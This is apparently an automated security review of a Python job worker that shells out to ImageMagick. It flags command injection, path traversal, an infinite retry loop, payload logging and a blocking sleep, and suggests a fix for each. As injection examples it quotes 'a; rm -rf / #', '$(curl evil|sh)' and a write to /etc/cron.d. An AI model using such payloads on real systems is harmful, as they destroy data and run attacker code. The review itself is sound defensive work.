findings.description: OS Command Injection (CWE-78/OWASP A03): attacker-controlled job.payload['source']/['dest'] are f-string-interpolated into a subprocess.run(cmd, shell=True) call with no sanitization, allowing arbitrary command execution (e.g. payload source 'a; rm -rf / #' or '$(curl evil|sh)'); fix by dropping shell=True and passing an arg list ['convert', src, dest].

Unrestricted/unvalidated file paths (CWE-22 path traversal, arbitrary file read/write): src and dest come straight from untrusted payload, so even after removing shell=True the attacker controls arbitrary input/output paths and ImageMagick pseudo-protocols (e.g. dest='/etc/cron.d/x', source='msl:...'); allow-list and canonicalize the paths.

Retry loop resets attempt=0 every iteration so the counter never advances past 1, producing an infinite loop on any permanently-failing job (availability/DoS: one poisoned job hangs the worker forever, blocking drain_sync/poll_loop) — primarily a logic defect, deferred to the logic critic.
Potential sensitive-data exposure in logs (CWE-532): full job.payload is json.dumps'd at INFO level, which may leak secrets/PII contained in job payloads.

Blocking time.sleep() (and synchronous run_with_retries) inside the async poll_loop stalls the entire event loop, a concurrency/availability defect — primarily performance, deferred to the performance critic.
